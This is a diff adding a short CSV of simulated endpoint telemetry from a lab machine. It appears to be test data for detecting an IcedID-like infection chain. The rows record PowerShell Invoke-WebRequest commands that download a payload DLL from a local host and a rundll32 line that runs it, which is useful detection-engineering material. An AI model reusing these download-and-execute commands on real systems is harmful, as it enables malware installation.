@@ -1,0 +1,6 @@
+
+Timestamp,ActionType,DeviceName,DeviceId,FileName,FolderPath,FileSize,InitiatingProcessFileName,InitiatingProcessId,InitiatingProcessCommandLine
+2026-02-07T16:29:05.872121,FileCreated,PC-LAB-01.contoso.local,bc1cce4a-b68c-455e-9020-4781c44769e0,update.dll,C:\\Users\\user1\\AppData\\Roaming\\Microsoft\\Templates,10240,powershell.exe,4321,"Invoke-WebRequest http://127.0.0.1:8080/payload.dll -OutFile ""C:\\Users\\user1\\AppData\\Roaming\\Microsoft\\Templates\\update.dll"""
+2026-02-07T16:29:06.872121,FileCreated,PC-LAB-01.contoso.local,bc1cce4a-b68c-455e-9020-4781c44769e0,license.dat,C:\\Users\\user1\\AppData\\Roaming,512,powershell.exe,4321,"Invoke-WebRequest http://127.0.0.1:8080/license.dat -OutFile ""C:\\Users\\user1\\AppData\\Roaming\\license.dat"""
+2026-02-07T16:29:07.872121,FileCreated,PC-LAB-01.contoso.local,bc1cce4a-b68c-455e-9020-4781c44769e0,icedid_lab.log,C:\\Users\\Public,128,rundll32.exe,6789,"rundll32.exe C:\\Users\\user1\\AppData\\Roaming\\Microsoft\\Templates\\update.dll,DllRegisterServer"
+2026-02-07T16:29:08.872121,FileCreated,PC-LAB-01.contoso.local,bc1cce4a-b68c-455e-9020-4781c44769e0,invoice.docx,C:\\Users\\user1\\Documents,2048,winword.exe,1234,winword.exe C:\\Users\\user1\\Documents\\invoice.docx
